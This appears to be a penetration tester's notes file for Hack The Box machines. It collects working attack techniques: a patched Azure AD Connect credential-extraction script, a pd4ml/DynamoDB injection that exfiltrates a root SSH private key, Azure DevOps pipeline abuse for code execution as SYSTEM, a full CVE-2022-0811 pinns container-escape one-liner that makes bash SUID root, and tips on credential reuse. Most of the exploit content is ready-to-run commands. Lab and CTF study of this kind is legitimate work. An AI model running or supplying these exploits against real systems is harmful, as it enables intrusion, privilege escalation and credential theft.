**Symptom (HTB Monteverde):** Running the canonical xpn `Get-AzureADCredentials.ps1` over evil-winrm fails with
```
SqlException: Unable to locate a Local Database Runtime installation.
```
even though `sqlservr.exe` runs as the AAD service account. The LocalDB runtime resolver is per-user-session and not exposed to the network logon.

**Fix:** swap the connection string from `Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync` to a direct-instance connection. The default SQL Server instance is reachable from the Azure-Admins-group user via integrated auth:
```powershell
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=.;Database=ADSync;Integrated Security=true"
```
Also add explicit casts on `LoadKeySet` args (some PS hosts otherwise raise `MethodArgumentConversionInvalidCastArgument` followed by an `AccessViolationException` in `mcrypt.dll`):
```powershell
$km.LoadKeySet([guid]$entropy, [guid]$instance_id, [int]$key_id)
```

---

## LocalStack-Backed HTB Cloud Boxes — Common Patterns

- **Default test/test creds always work.** `aws --endpoint-url http://s3.<host>` with `aws_access_key_id=test`/`aws_secret_access_key=test` is the LocalStack default — never spray; just use these.
- **Sync direction is webroot → S3, not S3 → webroot.** A cron typically runs `aws s3 sync /var/www/html/ s3://adserver/`, so files PUT to S3 by the attacker do NOT appear in the webroot. Don't waste time uploading PHP shells to S3 — search instead for *DynamoDB-backed* second-stage paths (e.g., pd4ml PDF generator on `localhost:8000`) that the webroot triggers based on table contents.
- **DynamoDB credential reuse is the real foothold.** The DDB `users` table on Bucket-style boxes contains `Sysadm`/`Cloudadm`/`Mgmt` users — one of those passwords is *always* the SSH password for the Linux user (`roy`/etc.). Try every `(linux_user, ddb_password)` combo before any RCE chain.
- **pd4ml file-read primitive.** Once inside, look for `/var/www/<appname>/` containing `pd4ml_demo.jar` and an `index.php` with `passthru("java ... Pd4Cmd file:///.../files/$name 800 A4 -out files/result.pdf")`. Insert into the configured DDB table (often filtered by `title=Ransomware` or similar) a row whose data field is `<html><pd4ml:attachment src="file:///root/.ssh/id_rsa" description="x" icon="Paperclip"/></html>`, POST `action=get_alerts` to localhost:8000, then `pdfdetach -saveall` the resulting `result.pdf` for the attached private key. Cleanup loops on these boxes delete attacker rows within ~60 s — chain everything in one SSH command and `base64 -w0` the PDF back over the same connection.

---

## Azure DevOps Server (NTLM) — Pipeline-as-Code RCE Pattern

**Authentication via `curl --ntlm -u user:pass`** (anonymous returns `TF400813: Resource not available for anonymous access`). The 302 to `/{collection}/` after auth is the success signal. Use `?api-version=5.1` for Azure DevOps Server 2019/2020 (6.0+ raises `VssVersionOutOfRangeException`).

**Trigger build on a feature branch when master is policy-protected** (HTB Worker pattern):
1. Push aspx/yaml to a new branch via `git -c http.extraHeader="Host: devops.target.htb" push`.
2. Queue an *existing* CI pipeline against the new branch:
   ```bash
   curl --ntlm -u user:pass -X POST -H 'Content-Type: application/json' \
     -d '{"definition":{"id":3},"sourceBranch":"refs/heads/<branch>"}' \
     "http://devops.target.htb/{coll}/{proj}/_apis/build/builds?api-version=5.1"
   ```
3. The build's CopyFiles task deploys to `w:\sites\<repo>.target.htb` — your aspx is now reachable on the IIS vhost. `iis apppool\defaultapppool` is enough to read the SVN `conf\passwd` file holding the next user's password.

**Privilege escalation via SYSTEM build agent:** create a *new* `azure-pipelines.yml` pipeline definition (YAML build, processType=2) on a new branch, queue it on the on-prem agent pool. The agent runs as `NT AUTHORITY\SYSTEM`, so the script step can `type C:\Users\Administrator\Desktop\root.txt` directly into the build log — read the log via `_apis/build/builds/<id>/logs/<n>?api-version=5.1`. No reverse shell required.

---

## CVE-2022-0811 — pinns Sysctl Splitter Container Escape

**One-liner from a low-priv user with the `pinns` SUID binary:**
```bash
echo '#!/bin/bash
chmod u+s /bin/bash' > /dev/shm/exp.sh && chmod +x /dev/shm/exp.sh

mkdir -p /dev/shm/exproot
pinns -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/dev/shm/exp.sh #' \
      -f exptest -d /dev/shm/exproot -U

sleep 100 & kill -SIGSEGV $!
/bin/bash -p
```
The `+` separator in the `-s` flag bypasses validation — only the first `key=value` is checked, the second silently overwrites `core_pattern`. `pinns -U` then fails with `Operation not permitted` *but the sysctl write has already happened*. SIGSEGV-ing any process triggers the new `core_pattern` (a pipe to our SUID-creating script). The pipe handler runs as root, leaving SUID-root `/bin/bash`.

---

## Electron Asar Reversal Pattern

For HTB-style "download our desktop client" boxes:
1. `unobtainium_debian.zip` → `7z x` → `dpkg-deb -X` (or `7z x data.tar.xz`) → `app.asar`.
2. `npx @electron/asar extract app.asar app/` exposes JS sources, including hardcoded `auth: {name, password}` and the API hostname.
3. The desktop client's API endpoint (port 31337 / 8443 / etc.) is the real attack surface; the Electron app is just a discovery vehicle for credentials and the prototype-pollution / cmd-injection sinks documented in its source.
